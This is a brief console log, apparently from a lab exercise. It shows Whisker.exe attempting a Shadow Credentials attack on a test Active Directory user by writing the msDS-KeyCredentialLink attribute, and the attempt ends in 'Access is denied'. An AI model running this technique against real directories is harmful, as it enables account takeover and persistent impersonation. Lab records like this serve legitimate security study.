PS C:\tools> .\Whisker.exe add /target:testUser
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password 5IFRmZtb5ShjHWNa
[*] Searching for the target account
[*] Target user found: CN=testUser,OU=ShadowCreds,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 2610dca1-4ddb-4fa1-b5d8-5e8cb3b73d26
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[X] Could not update attribute: Access is denied.


PS C:\tools> 